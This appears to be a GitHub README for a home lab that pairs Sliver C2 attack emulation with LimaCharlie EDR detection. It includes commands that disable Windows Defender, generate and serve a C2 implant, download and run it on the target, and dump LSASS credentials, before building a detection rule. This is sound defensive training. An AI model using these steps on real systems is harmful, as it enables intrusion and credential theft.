# LimaCharlie & Sliver C2: Adversary Emulation Lab

## Objective
This repository documents the adversary emulation lab using Sliver C2 for command-and-control attack simulation and LimaCharlie for endpoint detection and response. The goal is to simulate real-world attack scenarios, analyze telemetry data, and refine. 


The Detection Lab project aimed to establish a controlled environment for simulating and detecting cyber attacks. The primary focus was to ingest and analyze logs within a Security Information and Event Management (SIEM) system, generating test telemetry to mimic real-world attack scenarios. This hands-on experience was designed to deepen understanding of network security, attack patterns, and defensive strategies.

### Skills Learned

🔹 Endpoint Detection & Response (EDR)
- Deploying LimaCharlie Sensors for real-time telemetry collection.
- Integrating Sysmon with LimaCharlie to capture detailed process activity.
- Analyzing process telemetry to detect command-and-control (C2) activity.
- Building Detection & Response (D&R) rules to mitigate attacks.

🔹 Adversary Emulation & C2 Frameworks
- Setting up Sliver C2 to simulate real-world attack scenarios.
- Generating and deploying Sliver payloads for command execution.
- Interacting with active C2 sessions to mimic adversary behavior.
- Understanding detection evasion techniques used by Sliver.

🔹 Threat Hunting & Malware Analysis
- Examining process and file hashes to investigate suspicious binaries.
- Using VirusTotal to assess malware reputation and identify unknown threats.
- Dumping LSASS memory to simulate credential theft tactics.
- Filtering LimaCharlie telemetry for sensitive event detection.

🔹 Security Operations & Defensive Strategies
- Refining security detection logic for advanced threat detection.
- Investigating system behavior post-compromise for forensic insights.
- Applying MITRE ATT&CK mappings to real-world adversary techniques.




### Tools Used
🔹 Virtual Machines (VMs)
- Windows 10 (Target Machine) – Acts as the endpoint where Sliver C2 payloads are executed. LimaCharlie sensor is deployed here to capture telemetry.
- Kali Linux (Attacker Machine) – Used for launching Sliver C2, executing commands, and emulating adversary techniques.
- Ubuntu Server (Malware Storage) – Serves as the host for the malicious Sliver payloads, allowing downloads via an HTTP server for delivery to the Windows target.

🔹 LimaCharlie (EDR Platform)
A cloud-native endpoint detection & response (EDR) tool used to capture and analyze system telemetry. It provides:
- Real-time endpoint monitoring and security event logging.
- Detection & Response (D&R) rules for identifying adversary behaviors.
- Sysmon integration for enhanced process visibility.

🔹 Sliver C2 (Command & Control Framework)
An open-source command-and-control (C2) tool used to simulate real-world adversary techniques. Provides:
- Payload generation for remote access and execution.
- Session management to interact with compromised endpoints.
- Defensive tool awareness by highlighting detected security features.



## Steps

First thing we got to do is to remove security defense in Windows VM.
![image](https://github.com/user-attachments/assets/522aa5c2-c2f6-47f6-8298-5446112cf5c8)
![image](https://github.com/user-attachments/assets/dbf3fb49-1cbd-4e0e-986c-a8f1940a01fa)
![image](https://github.com/user-attachments/assets/fdee6963-0944-43e2-9838-a5c1abe6feff)


Some instances, the security settings will automatically turn on again, so we will ‘double disable’ it in gpedit.msc
(Computer configuration > Administrative Template > Windows Components > Microsoft Defender Antivirus)
![image](https://github.com/user-attachments/assets/cdcfb01e-7266-490f-b772-794580d5a60d)



Install Sysmon in Windows VM
-	Launch Administrative Powershell console 
-	Invoke-WebRequest -Uri https://download.systernals.com/files/Sysmon.zip -Outfile C:\Windows\Temp\Sysmon.zip 
-	Unzip Sysmon
-	Download SwiftonSecurity’s Sysmon config.
-	Invoke-WebRequest -Uri https://raw.githubuser.com/SwiftonSecurity/sysmon-config/master/sysmonconfig-export.xml -Outfile C:\Windows\Temp\Sysmon\sysmonconfig.xml
-	install Sysmon with Swift’s config
![image](https://github.com/user-attachments/assets/afe2d98a-898b-435a-baf3-cce9051807be)


Create organization in LimaCharlie (https://limacharlie.io/)
![image](https://github.com/user-attachments/assets/a7823c1b-a5a5-415b-b1f2-61f97550431d)

Add demo configuration : Extended Detection & Response Standard.

Add sensor. Follow the instruction in LimaCharlie Docs in telemetry sensor deployment
(https://docs.limacharlie.io/v1/docs/telemetry-sensor-deployment)
![image](https://github.com/user-attachments/assets/d4686476-6399-40a7-ad26-889a85327682)
![image](https://github.com/user-attachments/assets/2fd688a9-2dcf-49bb-a32a-d7db7f1d5426)
![image](https://github.com/user-attachments/assets/2b939926-b417-4df3-9140-6dccf88e33f7)
![image](https://github.com/user-attachments/assets/575a8aa6-f742-45ae-b3d5-ab28063de086)

Configure LimaCharlie to also ship the Sysmon event logs alongside its own EDR telemetry;
![image](https://github.com/user-attachments/assets/6e793633-8d4e-4465-894a-fde76fce9571)

![image](https://github.com/user-attachments/assets/faedc2b9-362c-4043-a80a-066ff7ab0b0c)


Setting up the attack: 
In Kali Linux, connect in Ubuntu server using SSH (ssh ‘user’@’ubuntu-server-IP’)

Then download the Sliver : wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -0 /usr/local/bin/sliver-server

Then make it executable : chmod +x /usr/local/bin/sliver-server

Also install mingw-w64 for additional capabilities : apt install -y mingw-w64
Launch sliver (sliver-server)
![image](https://github.com/user-attachments/assets/1847ef67-7a85-4b6b-8073-e66ff4839fd7)

Generate C2 payload : generate –http [Ubuntu server IP] –save /opt/sliver
![image](https://github.com/user-attachments/assets/86f3b718-f5e8-4d4d-8ede-64abeac8d593)

Setup a temporary server in Ubuntu server so the payload can be download by or target pc :
python3 -m http.server 80
Then switch to our Windows VM then launch administrative powershell :
IWR -Uri http://10.0.2.13/LOW_BAGGAGE.exe -Outfile C:\Users\vboxuser\Downloads\LOW_BAGGAGE.exe
![image](https://github.com/user-attachments/assets/068375e9-8f3b-48d7-bfcb-0b533b70ed6f)

Back to our (SSH)ubuntu server
Quit the python web server then relaunch the sliver-server, start http listener by typing ‘http’
![image](https://github.com/user-attachments/assets/43587b79-32a0-465f-aefc-99639eb26318)

Return to Windows VM then execute the C2 Payload using administrative powershell.
![image](https://github.com/user-attachments/assets/15d8eced-0fd9-4782-aa2d-8667b593b80a)
Verify by typing ‘sessions’
![image](https://github.com/user-attachments/assets/ccca4c27-7d32-4eb5-9f7d-d5b86cc50b6b)

Interact with C2 session : ‘use [session_id]
![image](https://github.com/user-attachments/assets/de63e25a-2c57-44c9-86e7-2c72ea213dff)

Get basic info: whoami,info

![image](https://github.com/user-attachments/assets/f31691f5-992d-4c0d-a32a-4c53e49ca3f5)

getprivs :

![image](https://github.com/user-attachments/assets/e56a8eba-3dfb-4096-80b4-ed654cb68ae2)

![image](https://github.com/user-attachments/assets/bacd162e-5a94-4360-a5c2-d9826b16d89a)

ps -T (sliver highlight the defensive tool as red and green as its own)
![image](https://github.com/user-attachments/assets/ed37bb45-62b7-48a5-beef-16ee45352e7b)


Go to LimaCharlie then check our sensor. Select the windows VM then go to process : 

![image](https://github.com/user-attachments/assets/0090cd77-b48a-4be1-8795-141ec01084d6)
![image](https://github.com/user-attachments/assets/94d49b43-c96e-4788-aecb-20b4b918c4a9)
![image](https://github.com/user-attachments/assets/8feefe4d-9451-4cf9-8ac8-b7c3db7c1721)

resources to learn more about windows processes and binaries threat actors use : 

https://www.sans.org/posters/hunt-evil/

https://lolbas-project.github.io/#


Go to file system of our windows machine in LimaCharlie to get the hash of file then inspect it to Virustotal.
![image](https://github.com/user-attachments/assets/31a37a86-5eb3-4c47-b449-81bfec0b325c)

**When you tried to check it to Virustotal. No results will found. 
But it doesn’t mean its innocent.
It’s just VirusTotal is never seen it before. This makes sense because we just generated the payload.
The important lesson for any analyst to learn : if you already suspect a file to be possible malware, but VirusTotal has never seen it before, trust your gut. This actually make a file even more suspicious because nearly everything  has been seen by VirusTotal, so the malware may be custom-crafter/targeted which ups the ante a bit.**


Next, lets dump the **lsass.exe** process from memory 

![image](https://github.com/user-attachments/assets/fcdb62d6-a7d1-482b-844e-d1300e2dfc19)

![image](https://github.com/user-attachments/assets/a3517011-f22c-4f91-beb3-5775ddfa09ec)


Go back to Timeline then filter for : “SENSITIVE_PROCESS_ACCESS”
![image](https://github.com/user-attachments/assets/07dc4bf9-05f8-413a-a2c2-779cfd03f577)


Then build a D&R rules from it. 
![image](https://github.com/user-attachments/assets/719bdde3-2a97-4374-8fbd-4dc78ef23451)

![image](https://github.com/user-attachments/assets/131deeb7-ca76-41e0-878a-fc769cf561e5)

Scroll to the bottom to test our D&R rule.
Paste the SENSITIVE_PROCESS_ACCESS code then click Test Event.
Save the rule.


![image](https://github.com/user-attachments/assets/d214a89a-277d-48d4-ad37-7179554ed140)

Try to dump the lsass.exe again using the same command to check if our rule is really working.

![image](https://github.com/user-attachments/assets/7e6780ad-4b1b-462a-839b-d36020855ab7)

![image](https://github.com/user-attachments/assets/3322d89e-b917-4468-8b68-33ccc7276477)



Special thanks to Eric Capuano. This is based on his blog “So you want to be a SOC Analyst?”
Also “Simply Cyber – Gerald Auger phD” youtube channel for making an updated walkthrough for this lab










